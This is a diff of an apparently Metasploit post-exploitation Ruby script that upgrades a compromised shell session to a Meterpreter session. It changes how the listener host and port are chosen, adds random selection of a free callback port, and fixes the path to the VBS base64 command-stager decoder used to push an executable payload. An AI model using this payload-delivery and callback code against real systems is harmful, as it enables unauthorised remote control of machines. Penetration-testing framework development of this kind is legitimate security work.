@@ -18,17 +18,39 @@ def progress(total, sent)
 end
 
 
-raise RuntimeError, "You must select a session." if (not session)
-raise RuntimeError, "Selected session is not a command shell session!" if (session.type != "shell")
+#
+# Returns if a port is used by a session
+#
+def is_port_used?(port)
+  framework.sessions.each do |sid, obj|
+    local_info = obj.instance_variable_get(:@local_info)
+    return true if local_info =~ /:#{port}$/
+  end
 
-# Check for required datastore options
-if (not session.exploit_datastore['LHOST'] or not session.exploit_datastore['LPORT'])
-  raise RuntimeError, "You must set LPORT and LHOST for this script to work."
+  false
 end
 
+#
+# Mimics what MSF alreayd does if the user doesn't manually select a payload and lhost
+#
+lhost = framework.datastore['LHOST']
+unless lhost
+  lhost = Rex::Socket.source_address
+end
 
-lhost = session.exploit_datastore['LHOST']
-lport = session.exploit_datastore['LPORT']
+#
+# If there is no LPORT defined in framework, then pick a random one that's not used
+# by current sessions. This is possible if the user assumes module datastore options
+# are the same as framework datastore options.
+#
+lport = framework.datastore['LPORT']
+unless lport
+  lport = 4444 # Default meterpreter port
+  while is_port_used?(lport)
+    # Pick a port that's not used
+    lport = [*49152..65535].sample
+  end
+end
 
 # maybe we want our sessions going to another instance?
 use_handler = true
@@ -85,7 +107,7 @@ begin
   end
   opts = {
     :linemax => linemax,
-    :decoder => File.join(Msf::Config.data_directory, "data", "exploits", "cmdstager", "vbs_b64"),
+    :decoder => File.join(Msf::Config.data_directory, "exploits", "cmdstager", "vbs_b64"),
     #:nodelete => true # keep temp files (for debugging)
   }
   exe = Msf::Util::EXE.to_executable(framework, larch, lplat, buf)
